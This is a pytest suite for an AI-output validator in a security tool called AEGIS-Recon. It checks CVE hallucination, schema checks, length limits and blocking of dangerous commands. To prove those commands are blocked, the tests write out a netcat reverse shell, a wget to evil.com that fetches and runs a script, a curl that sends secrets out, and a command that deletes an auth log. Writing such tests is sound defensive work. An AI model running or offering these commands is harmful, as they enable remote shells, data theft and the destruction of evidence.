"""
Comprehensive AI safety and security tests for AEGIS-Recon.

Tests the existing app/ai/validator.py against:
1. Prompt injection attempts (malicious content in AI output)
2. CVE hallucination (CVEs not in input_cve_ids)
3. Unsafe command patterns (bash, sudo, nmap, exploit, metasploit, nc, wget, etc.)
4. Malformed JSON
5. Missing required fields
6. Length limit enforcement
7. Data exfiltration patterns
8. Claim-level grounding validation

The validator MUST block all dangerous content. These tests verify those blocks.
"""

from __future__ import annotations

import json

import pytest

from app.ai.validator import validate_ai_output
from app.core.errors import LLMValidationError


def _valid_output(
    summary: str = "System shows signs of moderate risk.",
    risk_overview: str = "Two medium-severity findings detected.",
    recommendations: list[str] | None = None,
    limitations: str = "Analysis based on NVD data only.",
    confidence_notes: str = "Version match confidence: medium.",
    extra: dict | None = None,
) -> str:
    """Helper: build a valid AI output JSON string."""
    data: dict = {
        "summary": summary,
        "risk_overview": risk_overview,
        "recommendations": recommendations or ["Update affected packages."],
        "limitations": limitations,
        "confidence_notes": confidence_notes,
    }
    if extra:
        data.update(extra)
    return json.dumps(data)


ALLOWED_CVES = {"CVE-2021-44228", "CVE-2021-45046", "CVE-2023-1234"}


# ── Valid Output Tests ────────────────────────────────────────────────────────


class TestValidOutputAccepted:
    def test_clean_output_passes(self):
        """A clean, well-formed output should pass all checks."""
        out = _valid_output()
        result = validate_ai_output(out, ALLOWED_CVES)
        assert "summary" in result
        assert "recommendations" in result

    def test_allowed_cve_reference_passes(self):
        """Referencing an allowed CVE in output is OK."""
        out = _valid_output(
            summary="CVE-2021-44228 (Log4Shell) detected in this scan.",
            risk_overview="Log4Shell is critical severity.",
        )
        result = validate_ai_output(out, ALLOWED_CVES)
        assert result is not None

    def test_markdown_wrapped_json_is_unwrapped(self):
        """JSON wrapped in ```json ... ``` markdown should be accepted."""
        inner = _valid_output()
        wrapped = f"```json\n{inner}\n```"
        result = validate_ai_output(wrapped, ALLOWED_CVES)
        assert "summary" in result

    def test_empty_cve_set_accepts_no_cves(self):
        """With no input CVEs, any CVE reference in output is hallucination."""
        out = _valid_output(summary="All systems healthy.")
        result = validate_ai_output(out, set())
        assert result is not None


# ── CVE Hallucination Tests ───────────────────────────────────────────────────


class TestCVEHallucinationBlocked:
    def test_hallucinated_cve_rejected(self):
        """CVE not in input set should be rejected as hallucination."""
        out = _valid_output(summary="CVE-2099-9999 affects this system critically.")
        with pytest.raises(LLMValidationError, match="not in input data"):
            validate_ai_output(out, ALLOWED_CVES)

    def test_future_year_cve_rejected(self):
        """A CVE from 2099 (obviously fabricated) should be rejected."""
        out = _valid_output(recommendations=["Patch CVE-2099-0001 immediately."])
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_multiple_hallucinated_cves_rejected(self):
        """Multiple hallucinated CVEs should all be caught."""
        out = _valid_output(
            summary="CVE-2020-0001 and CVE-2019-9999 found.",
            risk_overview="These are critical.",
        )
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_cve_in_empty_allowed_set_rejected(self):
        """If input has no CVEs, any CVE mention is hallucination."""
        out = _valid_output(summary="CVE-2021-44228 is critical.")
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, set())

    def test_allowed_cve_not_hallucination(self):
        """A CVE that IS in the input set must not be rejected."""
        out = _valid_output(summary="CVE-2021-44228 should be patched.")
        result = validate_ai_output(out, ALLOWED_CVES)
        assert result is not None


# ── Dangerous Pattern Blocking ────────────────────────────────────────────────


class TestDangerousPatternsBlocked:
    def test_bash_code_fence_blocked(self):
        """Output containing ```bash code block should be rejected."""
        out = _valid_output(risk_overview="Run: ```bash\nnmap -sS 10.0.0.1\n```")
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_shell_code_fence_blocked(self):
        """Output containing ```shell should be rejected."""
        out = _valid_output(recommendations=["```shell\napt-get install tool\n```"])
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_sudo_command_blocked(self):
        """Output containing 'sudo' should be rejected."""
        out = _valid_output(recommendations=["sudo apt-get update && sudo apt-get upgrade"])
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_nmap_scan_command_blocked(self):
        """Output containing an nmap command should be rejected."""
        out = _valid_output(risk_overview="Run nmap -sS -sV target to verify.")
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_exploit_run_blocked(self):
        """Output telling user to 'exploit' and 'run' should be rejected."""
        out = _valid_output(recommendations=["exploit run against the target to confirm."])
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_metasploit_blocked(self):
        """Output mentioning metasploit should be rejected."""
        out = _valid_output(risk_overview="Use metasploit to test the vulnerability.")
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_msfconsole_blocked(self):
        """Output mentioning msfconsole should be rejected."""
        out = _valid_output(summary="Open msfconsole and use the exploit module.")
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_netcat_nc_blocked(self):
        """Output with nc -e or nc -l should be rejected."""
        out = _valid_output(recommendations=["nc -e /bin/bash 10.0.0.1 4444"])
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_wget_data_exfiltration_blocked(self):
        """wget to external URL in output should be rejected."""
        out = _valid_output(
            recommendations=["wget http://evil.com/shell.sh -O /tmp/s && bash /tmp/s"]
        )
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_curl_data_exfiltration_blocked(self):
        """curl to external URL in output should be rejected."""
        out = _valid_output(risk_overview="curl http://exfil.example.com/?data=secrets")
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)

    def test_rm_rf_in_recommendations_blocked(self):
        """sudo rm -rf in recommendations should be rejected (sudo pattern)."""
        out = _valid_output(recommendations=["sudo rm -rf /var/log/auth.log"])
        with pytest.raises(LLMValidationError):
            validate_ai_output(out, ALLOWED_CVES)


# ── Schema Validation ─────────────────────────────────────────────────────────


class TestSchemaValidation:
    def test_malformed_json_rejected(self):
        """Malformed JSON must be rejected."""
        with pytest.raises(LLMValidationError, match="not valid JSON"):
            validate_ai_output("{bad json: true", ALLOWED_CVES)

    def test_json_array_rejected(self):
        """JSON array (not object) must be rejected."""
        with pytest.raises(LLMValidationError):
            validate_ai_output('["item1", "item2"]', ALLOWED_CVES)

    def test_missing_summary_rejected(self):
        """Output missing 'summary' field must be rejected."""
        data = {
            "risk_overview": "Medium risk.",
            "recommendations": ["Update."],
            "limitations": "Version-based only.",
        }
        with pytest.raises(LLMValidationError, match="missing required fields"):
            validate_ai_output(json.dumps(data), ALLOWED_CVES)

    def test_missing_recommendations_rejected(self):
        """Output missing 'recommendations' field must be rejected."""
        data = {
            "summary": "Moderate risk.",
            "risk_overview": "Two findings.",
            "limitations": "Limited.",
        }
        with pytest.raises(LLMValidationError, match="missing required fields"):
            validate_ai_output(json.dumps(data), ALLOWED_CVES)

    def test_missing_limitations_rejected(self):
        """Output missing 'limitations' field must be rejected."""
        data = {
            "summary": "Moderate risk.",
            "risk_overview": "Two findings.",
            "recommendations": ["Update packages."],
        }
        with pytest.raises(LLMValidationError, match="missing required fields"):
            validate_ai_output(json.dumps(data), ALLOWED_CVES)

    def test_empty_string_is_invalid_json(self):
        """Empty string must be rejected as invalid JSON."""
        with pytest.raises(LLMValidationError):
            validate_ai_output("", ALLOWED_CVES)


# ── Length Limit Enforcement ──────────────────────────────────────────────────


class TestLengthLimits:
    def test_long_summary_truncated(self):
        """Summary over 2000 chars must be truncated to 2000."""
        long_summary = "A" * 5000
        out = _valid_output(summary=long_summary)
        result = validate_ai_output(out, ALLOWED_CVES)
        assert len(result["summary"]) == 2000

    def test_long_risk_overview_truncated(self):
        """risk_overview over 3000 chars must be truncated."""
        long_text = "B" * 6000
        out = _valid_output(risk_overview=long_text)
        result = validate_ai_output(out, ALLOWED_CVES)
        assert len(result["risk_overview"]) == 3000

    def test_too_many_recommendations_trimmed(self):
        """More than 20 recommendations must be trimmed to 20."""
        recs = [f"Recommendation {i}" for i in range(50)]
        out = _valid_output(recommendations=recs)
        result = validate_ai_output(out, ALLOWED_CVES)
        assert len(result["recommendations"]) == 20

    def test_long_single_recommendation_truncated(self):
        """Each recommendation is capped at 500 chars."""
        long_rec = "X" * 1000
        out = _valid_output(recommendations=[long_rec])
        result = validate_ai_output(out, ALLOWED_CVES)
        assert len(result["recommendations"][0]) == 500


# ── Claim-Level Grounding ─────────────────────────────────────────────────────


class TestClaimGrounding:
    """
    Tests for check_claim_grounding() — claim-level CVE grounding.

    This function checks if a claim references only allowed CVEs.
    """

    def test_claim_with_allowed_cve_is_supported(self):
        """A claim referencing an allowed CVE is SUPPORTED."""
        from app.ai.validator import check_claim_grounding

        result = check_claim_grounding(
            "CVE-2021-44228 affects this system and requires immediate patching.",
            allowed_cves={"CVE-2021-44228"},
        )
        assert result == "SUPPORTED"

    def test_claim_with_hallucinated_cve_is_unsupported(self):
        """A claim referencing a CVE not in the allowed set is UNSUPPORTED."""
        from app.ai.validator import check_claim_grounding

        result = check_claim_grounding(
            "CVE-2099-9999 is a critical zero-day.",
            allowed_cves={"CVE-2021-44228"},
        )
        assert result == "UNSUPPORTED"

    def test_claim_without_cve_is_unchecked(self):
        """A claim with no CVE reference returns UNCHECKED."""
        from app.ai.validator import check_claim_grounding

        result = check_claim_grounding(
            "The system should be patched regularly.",
            allowed_cves={"CVE-2021-44228"},
        )
        assert result == "UNCHECKED"

    def test_claim_mixed_cves_is_unsupported(self):
        """A claim with both allowed and hallucinated CVEs is UNSUPPORTED."""
        from app.ai.validator import check_claim_grounding

        result = check_claim_grounding(
            "CVE-2021-44228 and CVE-2099-0001 both affect this target.",
            allowed_cves={"CVE-2021-44228"},
        )
        assert result == "UNSUPPORTED"

    def test_empty_claim_is_unchecked(self):
        """Empty claim returns UNCHECKED."""
        from app.ai.validator import check_claim_grounding

        result = check_claim_grounding("", allowed_cves={"CVE-2021-44228"})
        assert result == "UNCHECKED"

    def test_multiple_allowed_cves_all_supported(self):
        """A claim using multiple allowed CVEs is SUPPORTED."""
        from app.ai.validator import check_claim_grounding

        result = check_claim_grounding(
            "CVE-2021-44228 and CVE-2021-45046 are related Log4Shell variants.",
            allowed_cves=ALLOWED_CVES,
        )
        assert result == "SUPPORTED"
